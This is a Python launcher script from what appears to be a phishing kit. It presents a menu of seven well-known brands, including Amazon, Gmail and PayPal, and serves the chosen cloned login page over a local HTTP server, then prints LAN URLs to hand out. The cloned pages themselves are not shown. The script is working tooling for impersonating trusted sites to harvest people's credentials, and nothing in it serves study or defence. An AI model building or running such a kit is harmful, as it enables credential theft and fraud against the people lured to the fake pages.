from utils import print_welcome_message, get_local_ip, cleanup
import subprocess
import time
from colorama import Fore, Style

sites = {
    "1": {"name": "Amazon", "html": "amazon.html", "dir": "apps/amazon"},
    "2": {"name": "Ebay", "html": "ebay.html", "dir": "apps/ebay"},
    "3": {"name": "Gmail", "html": "gmail.html", "dir": "apps/gmail"},
    "4": {"name": "LinkedIn", "html": "linkedin.html", "dir": "apps/linkedin"},
    "5": {"name": "YouTube", "html": "youtube.html", "dir": "apps/youtube"},
    "6": {"name": "Netflix", "html": "netflix.html", "dir": "apps/netflix"},
    "7": {"name": "PayPal", "html": "paypal.html", "dir": "apps/paypal"}
}

def main():
    print_welcome_message()
    for key, site in sites.items():
        print(f"[{key}] {site['name']}")

    choice = input(f"{Fore.GREEN}[?] Select site ==> {Style.RESET_ALL}")
    
    if choice in sites:
        site = sites[choice]
        
        # Start server
        server = subprocess.Popen(
            ["python", "-m", "http.server", "8000"], 
            cwd=site['dir'], 
            stdout=subprocess.DEVNULL, 
            stderr=subprocess.DEVNULL
        )
        time.sleep(2)
        
        # Show URLs
        local_ip = get_local_ip()
        print(f"{Fore.BLUE}[LOCAL]  http://localhost:8000/{site['html']}{Style.RESET_ALL}")
        print(f"{Fore.BLUE}[NETWORK] http://{local_ip}:8000/{site['html']}{Style.RESET_ALL}")
        print(f"\n{Fore.YELLOW}[INFO] Press Ctrl+C to stop server.{Style.RESET_ALL}")
        
        # Keep running
        try:
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            print(f"\n{Fore.YELLOW}[INFO] Shutting down...{Style.RESET_ALL}")
    else:
        print(f"{Fore.RED}[X] Invalid selection.{Style.RESET_ALL}")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}[INFO] Program terminated.{Style.RESET_ALL}")
    finally:
        cleanup()